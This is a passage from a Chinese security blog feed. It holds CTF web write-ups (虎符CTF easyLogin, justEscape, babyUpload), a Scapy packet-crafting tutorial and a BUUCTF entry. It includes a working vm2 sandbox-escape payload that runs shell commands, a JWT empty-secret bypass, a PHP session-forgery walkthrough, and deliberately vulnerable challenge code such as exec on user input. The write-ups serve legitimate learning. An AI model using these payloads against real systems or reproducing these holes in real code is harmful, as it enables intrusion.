&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    $sandbox = &lt;span class=&quot;string&quot;&gt;&amp;#x27;/www/sandbox/&amp;#x27;&lt;/span&gt; . md5(&lt;span class=&quot;string&quot;&gt;&amp;quot;orange&amp;quot;&lt;/span&gt; . $_SERVER[&lt;span class=&quot;string&quot;&gt;&amp;#x27;REMOTE_ADDR&amp;#x27;&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    @mkdir($sandbox);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    @chdir($sandbox);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;keyword&quot;&gt;isset&lt;/span&gt;($_GET[&lt;span class=&quot;string&quot;&gt;&amp;#x27;cmd&amp;#x27;&lt;/span&gt;]) &amp;amp;&amp;amp; strlen($_GET[&lt;span class=&quot;string&quot;&gt;&amp;#x27;cmd&amp;#x27;&lt;/span&gt;]) &amp;lt;= &lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        @exec($_GET[&lt;span class=&quot;string&quot;&gt;&amp;#x27;cmd&amp;#x27;&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;keyword&quot;&gt;isset&lt;/span&gt;($_GET[&lt;span class=&quot;string&quot;&gt;&amp;#x27;reset&amp;#x27;&lt;/span&gt;])) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        @exec(&lt;span class=&quot;string&quot;&gt;&amp;#x27;/bin/rm -rf &amp;#x27;&lt;/span&gt; . $sandbox);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    highlight_file(&lt;span class=&quot;keyword&quot;&gt;__FILE__&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;源码很容易看，就限制长度嘛，干就完了。&lt;/p&gt;</summary>
    
    
    
    <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="RCE" scheme="http://yoursite.com/tags/RCE/"/>
    
    <category term="PHP" scheme="http://yoursite.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>虎符CTF-Web复现</title>
    <link href="http://yoursite.com/2020/04/21/%E8%99%8E%E7%AC%A6CTF-Web%E5%A4%8D%E7%8E%B0/"/>
    <id>http://yoursite.com/2020/04/21/%E8%99%8E%E7%AC%A6CTF-Web%E5%A4%8D%E7%8E%B0/</id>
    <published>2020-04-21T04:33:12.000Z</published>
    <updated>2020-04-21T10:46:10.374Z</updated>
    
    <content type="html"><![CDATA[<h2 id="easyLogin"><a href="#easyLogin" class="headerlink" title="easyLogin"></a>easyLogin</h2><p>知识点：</p><ul><li>NodeJS代码审计</li><li>NodeJS依赖库缺陷</li></ul><p>NodeJS的jwt依赖库的空加密缺陷，将secretid置为空即可绕过限制，登录admin账户，然后GET /api/flag就可以获得flag。</p><a id="more"></a><p><img src= "/img/loading.gif" data-lazy-src="2.png"></p><p>2019年的UNCTF里面就有一道题里面涉及了这个知识点（当时这道题没复现。。。。后悔</p><p><a href="https://xz.aliyun.com/t/2338">https://xz.aliyun.com/t/2338</a></p><p><a href="https://evoa.me/index.php/archives/60/">https://evoa.me/index.php/archives/60/</a></p><p>其实这道题还有一个可以利用的任意文件读取漏洞，可以拿下源码进行审计。</p><p>直接访问对应文件就可以，例如</p><p><img src= "/img/loading.gif" data-lazy-src="3.png"></p><p>这样就可以将项目所有的文件都读取到，具体参考 <a href="https://www.zhaoj.in/read-6512.html">https://www.zhaoj.in/read-6512.html</a></p><h2 id="justEscape"><a href="#justEscape" class="headerlink" title="justEscape"></a>justEscape</h2><p>知识点：</p><ul><li>vm.js 沙箱逃逸与过滤绕过</li></ul><p>这道题出题人恶趣味的在run.php混淆视听，用了PHP的一堆东西试了试，发现不行，扔了个81打出了81，还以为是python写的后台，比赛的时候就卡在这里了</p><p>其实是NodeJS的后台，可以丢个报错看看</p><p><img src= "/img/loading.gif" data-lazy-src="1.png"></p><p>这个报错内容可以看到是用<strong>vm2</strong>的框架，直接先去GitHub嫖一个逃逸的payload</p><p> <a href="https://github.com/patriksimek/vm2/issues/225">https://github.com/patriksimek/vm2/issues/225</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">        Buffer.from(<span class="keyword">new</span> <span class="built_in">Proxy</span>(&#123;&#125;, &#123;</span><br><span class="line">            getOwnPropertyDescriptor()&#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="function"><span class="params">f</span>=&gt;</span>f.constructor(<span class="string">&quot;return process&quot;</span>)();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;));</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">         e(<span class="function">()=&gt;</span>&#123;&#125;).mainModule.require(<span class="string">&quot;child_process&quot;</span>).execSync(<span class="string">&quot;whoami&quot;</span>).toString();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>然后数组bypass，<strong>run.php?code[]=***</strong></p><p>getshell</p><h2 id="babyUpload"><a href="#babyUpload" class="headerlink" title="babyUpload"></a>babyUpload</h2><p>知识点：</p><ul><li>session伪造</li><li>session处理方式判断</li><li>函数特性</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_save_path(<span class="string">&quot;/var/babyctf/&quot;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;/flag&quot;</span>;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">&#x27;username&#x27;</span>] ===<span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    $filename=<span class="string">&#x27;/var/babyctf/success.txt&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists($filename))&#123;</span><br><span class="line">            safe_delete($filename);</span><br><span class="line">            <span class="keyword">die</span>($flag);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;username&#x27;</span>] =<span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$direction = filter_input(INPUT_POST, <span class="string">&#x27;direction&#x27;</span>);</span><br><span class="line">$attr = filter_input(INPUT_POST, <span class="string">&#x27;attr&#x27;</span>);</span><br><span class="line">$dir_path = <span class="string">&quot;/var/babyctf/&quot;</span>.$attr;</span><br><span class="line"><span class="keyword">if</span>($attr===<span class="string">&quot;private&quot;</span>)&#123;</span><br><span class="line">    $dir_path .= <span class="string">&quot;/&quot;</span>.$_SESSION[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($direction === <span class="string">&quot;upload&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!is_uploaded_file($_FILES[<span class="string">&#x27;up_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;invalid upload&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $file_path = $dir_path.<span class="string">&quot;/&quot;</span>.$_FILES[<span class="string">&#x27;up_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        $file_path .= <span class="string">&quot;_&quot;</span>.hash_file(<span class="string">&quot;sha256&quot;</span>,$_FILES[<span class="string">&#x27;up_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/(\.\.\/|\.\.\\\\)/&#x27;</span>, $file_path))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;invalid file path&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        @mkdir($dir_path, <span class="number">0700</span>, <span class="literal">TRUE</span>);</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($_FILES[<span class="string">&#x27;up_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>],$file_path))&#123;</span><br><span class="line">            $upload_result = <span class="string">&quot;uploaded&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;error while saving&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="built_in">RuntimeException</span> $e) &#123;</span><br><span class="line">        $upload_result = $e-&gt;getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">elseif</span> ($direction === <span class="string">&quot;download&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        $filename = basename(filter_input(INPUT_POST, <span class="string">&#x27;filename&#x27;</span>));</span><br><span class="line">        $file_path = $dir_path.<span class="string">&quot;/&quot;</span>.$filename;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/(\.\.\/|\.\.\\\\)/&#x27;</span>, $file_path))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;invalid file path&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!file_exists($file_path)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;file not exist&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        header(<span class="string">&#x27;Content-Type: application/force-download&#x27;</span>);</span><br><span class="line">        header(<span class="string">&#x27;Content-Length: &#x27;</span>.filesize($file_path));</span><br><span class="line">        header(<span class="string">&#x27;Content-Disposition: attachment; filename=&quot;&#x27;</span>.substr($filename, <span class="number">0</span>, <span class="number">-65</span>).<span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(readfile($file_path))&#123;</span><br><span class="line">            $download_result = <span class="string">&quot;downloaded&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;error while saving&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="built_in">RuntimeException</span> $e) &#123;</span><br><span class="line">        $download_result = $e-&gt;getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>源码直接给了，稍微读一下源码，可以知道这道题需要伪造session</p><p>总体思路就是，伪造session获得admin权限–&gt;上传success.txt文件–&gt;获得flag</p><p>我们知道session文件的存储文件名为sess_{sessid}</p><p>于是我们构造题目download的请求，获得一个session看看格式</p><p><img src= "/img/loading.gif" data-lazy-src="5.png"></p><p><img src= "/img/loading.gif" data-lazy-src="4.png"></p><p>根据格式可以判断其 session 处理器为 php_binary，则使用本地的的 PHP，将其 session 处理器改为 php_binary，然后利用其来生成 session 文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_binary&#x27;</span>);</span><br><span class="line">session_save_path(<span class="string">&quot;./test&quot;</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;admin&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="6.png"></p><p>然后用PHP命令将文件进行哈希</p><p><img src= "/img/loading.gif" data-lazy-src="7.png"></p><p>将文件重命名为<em>sess</em>之后，利用题目的upload上传，这里如此重命名文件名的原因是，在源码中，服务器对上传的文件进行了哈希摘要，如下，所以文件上传之后的文件名就变成了我们想要的sess_{hash(sessid)}</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$file_path = $dir_path.<span class="string">&quot;/&quot;</span>.$_FILES[<span class="string">&#x27;up_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">$file_path .= <span class="string">&quot;_&quot;</span>.hash_file(<span class="string">&quot;sha256&quot;</span>,$_FILES[<span class="string">&#x27;up_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="8.png"></p><p>上传之后download一下看看是否成功</p><p><img src= "/img/loading.gif" data-lazy-src="9.png"></p><p><img src= "/img/loading.gif" data-lazy-src="10.png"></p><p>剩下的事情就简单了，先修改一下页面的cookie值</p><p><img src= "/img/loading.gif" data-lazy-src="13.png"></p><p>然后上传success.txt文件，但是这里并不能直接控制文件名。所以要利用到file_exists()方法的特性,在 PHP 文档中写到这个函数用于判断文件或者目录是否存在。</p><p>虽然我们不能完全控制上传的文件名，但上传的路径我们是可以控制的，所以我们只需要在 /var/babyctf/ 下创建一个 success.txt 目录即可。</p><p>还记得之前的 attr 参数吗，我们将其改为 success.txt，即可创建一个 success.txt 目录。</p><p><img src= "/img/loading.gif" data-lazy-src="11.png"></p><p>刷新页面，flag到手</p><p><img src= "/img/loading.gif" data-lazy-src="12.png"></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;easyLogin&quot;&gt;&lt;a href=&quot;#easyLogin&quot; class=&quot;headerlink&quot; title=&quot;easyLogin&quot;&gt;&lt;/a&gt;easyLogin&lt;/h2&gt;&lt;p&gt;知识点：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;NodeJS代码审计&lt;/li&gt;
&lt;li&gt;NodeJS依赖库缺陷&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;NodeJS的jwt依赖库的空加密缺陷，将secretid置为空即可绕过限制，登录admin账户，然后GET /api/flag就可以获得flag。&lt;/p&gt;</summary>
    
    
    
    <category term="WP" scheme="http://yoursite.com/categories/WP/"/>
    
    
    <category term="NodeJS代码审计" scheme="http://yoursite.com/tags/NodeJS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="vm2沙箱逃逸" scheme="http://yoursite.com/tags/vm2%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
    
    <category term="file_exists" scheme="http://yoursite.com/tags/file-exists/"/>
    
    <category term="PHPsession伪造" scheme="http://yoursite.com/tags/PHPsession%E4%BC%AA%E9%80%A0/"/>
    
    <category term="PHP代码审计" scheme="http://yoursite.com/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>用Scapy玩网络</title>
    <link href="http://yoursite.com/2020/04/01/%E7%94%A8Scapy%E7%8E%A9%E7%BD%91%E7%BB%9C/"/>
    <id>http://yoursite.com/2020/04/01/%E7%94%A8Scapy%E7%8E%A9%E7%BD%91%E7%BB%9C/</id>
    <published>2020-04-01T09:56:05.000Z</published>
    <updated>2020-04-01T14:58:35.479Z</updated>
    
    <content type="html"><![CDATA[<h2 id="什么是Scapy"><a href="#什么是Scapy" class="headerlink" title="什么是Scapy"></a>什么是Scapy</h2><p>Scapy是一个强大的，用Python编写的交互式数据包处理程序，它能让用户发送、嗅探、解析，以及伪造网络报文，从而用来侦测、扫描和向网络发动攻击。Scapy可以轻松地处理扫描(scanning)、路由跟踪(tracerouting)、探测(probing)、单元测试(unit tests)、攻击(attacks)和发现网络(network discorvery)之类的传统任务。它可以代替<code>hping</code>,<code>arpspoof</code>,<code>arp-sk</code>,<code>arping</code>,<code>p0f</code> 甚至是部分的<code>Nmap</code>,<code>tcpdump</code>和<code>tshark</code> 的功能。</p><a id="more"></a><h2 id="基操"><a href="#基操" class="headerlink" title="基操"></a>基操</h2><h3 id="构造数据包"><a href="#构造数据包" class="headerlink" title="构造数据包"></a>构造数据包</h3><p>scapy能够很自由轻松的操作数据包，我们用<code>from scapy.all import * </code>导入包，然后用<code>IP()</code>就可以构造一个最简单的IP协议数据包数据包，然后可以用<code>ls()</code>来查看参数：</p><p><img src= "/img/loading.gif" data-lazy-src="1.png"></p><p>对比一下我们熟悉的IP协议的报文结构，是不是突然对scapy的方便之处有了一丝理解呢</p><p><img src= "/img/loading.gif" data-lazy-src="3.png"></p><p>其他的协议也是同理</p><p>利用show()也可以查看数据包的内容</p><p><img src= "/img/loading.gif" data-lazy-src="4.png"></p><p>还有summary()方法查看概要信息，hexdump()方法查看数据包的字节信息，就不放图片了。</p><h3 id="发送数据包"><a href="#发送数据包" class="headerlink" title="发送数据包"></a>发送数据包</h3><p>scapy发送数据包有常用的如下几种方法：</p><ul><li>send(pkt) 发送三层数据包，但不会受到返回的结果。</li><li>sr(pkt) 发送三层数据包，返回两个结果，分别是接收到响应的数据包和未收到响应的数据包。</li><li>sr1(pkt) 发送三层数据包，仅仅返回接收到响应的数据包。</li><li>sendp(pkt) 发送二层数据包。</li><li>srp(pkt) 发送二层数据包，并等待响应。</li><li>srp1(pkt) 发送第二层数据包，并返回响应的数据包</li></ul><h2 id="写点小东西"><a href="#写点小东西" class="headerlink" title="写点小东西"></a>写点小东西</h2><h3 id="SYN扫描"><a href="#SYN扫描" class="headerlink" title="SYN扫描"></a>SYN扫描</h3><p>也叫“半开式扫描”（half-open scanning），因为它没有完成一个完整的TCP连接。这种方法向目标端口发送一个SYN分组（packet），如果目标端口返回SYN/ACK，那么可以肯定该端口处于检听状态；否则，返回的是RST/ACK</p><p><code>sr1(IP(dst=&quot;www.baidu.com&quot;)/TCP(dport=80,flags=&quot;S&quot;))</code></p><p>我们运行上面这句代码，flags=”S”的含义是发送SYN数据包，端口返回的flag位为SA，表示这些端口是开放的。而RA表示reset ack， 说明这些端口是关闭的。如图：</p><p><img src= "/img/loading.gif" data-lazy-src="7.png"></p><h3 id="traceroute路由追踪"><a href="#traceroute路由追踪" class="headerlink" title="traceroute路由追踪"></a>traceroute路由追踪</h3><p><img src= "/img/loading.gif" data-lazy-src="9.png"></p><h3 id="模拟TCP三次握手"><a href="#模拟TCP三次握手" class="headerlink" title="模拟TCP三次握手"></a>模拟TCP三次握手</h3><p><img src= "/img/loading.gif" data-lazy-src="10.png"></p><h2 id="搞事（操作PCAP文件以及利用ARP进行攻击）"><a href="#搞事（操作PCAP文件以及利用ARP进行攻击）" class="headerlink" title="搞事（操作PCAP文件以及利用ARP进行攻击）"></a>搞事（操作PCAP文件以及利用ARP进行攻击）</h2>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;什么是Scapy&quot;&gt;&lt;a href=&quot;#什么是Scapy&quot; class=&quot;headerlink&quot; title=&quot;什么是Scapy&quot;&gt;&lt;/a&gt;什么是Scapy&lt;/h2&gt;&lt;p&gt;Scapy是一个强大的，用Python编写的交互式数据包处理程序，它能让用户发送、嗅探、解析，以及伪造网络报文，从而用来侦测、扫描和向网络发动攻击。Scapy可以轻松地处理扫描(scanning)、路由跟踪(tracerouting)、探测(probing)、单元测试(unit tests)、攻击(attacks)和发现网络(network discorvery)之类的传统任务。它可以代替&lt;code&gt;hping&lt;/code&gt;,&lt;code&gt;arpspoof&lt;/code&gt;,&lt;code&gt;arp-sk&lt;/code&gt;,&lt;code&gt;arping&lt;/code&gt;,&lt;code&gt;p0f&lt;/code&gt; 甚至是部分的&lt;code&gt;Nmap&lt;/code&gt;,&lt;code&gt;tcpdump&lt;/code&gt;和&lt;code&gt;tshark&lt;/code&gt; 的功能。&lt;/p&gt;</summary>
    
    
    
    <category term="Something" scheme="http://yoursite.com/categories/Something/"/>
    
    
    <category term="python" scheme="http://yoursite.com/tags/python/"/>
    
    <category term="网络" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C/"/>
    
    <category term="Scapy" scheme="http://yoursite.com/tags/Scapy/"/>
    
  </entry>
  
  <entry>
    <title>刷题记录:BUUCTF admin</title>
    <link href="http://yoursite.com/2020/04/01/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-BUUCTF-admin/"/>
    <id>http://yoursite.com/2020/04/01/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-BUUCTF-admin/</id>
    <published>2020-03-31T17:09:05.000Z</published>
    <updated>2020-03-31T17:40:16.853Z</updated>
    
    <content type="html"><![CDATA[<p>刷题记录:BUUCTF admin</p><a id="more"></a><div class="row">    <embed src="buuctf之admin-writeup.pdf" width="100%" height="550" type="application/pdf"></div>]]></content>
    
    
    <summary type="html">&lt;p&gt;刷题记录:BUUCTF admin&lt;/p&gt;</summary>
    
    
    
    <category term="WP" scheme="http://yoursite.com/categories/WP/"/>
    
    
    <category term="flask session" scheme="http://yoursite.com/tags/flask-session/"/>
    
  </entry>
  
</feed>
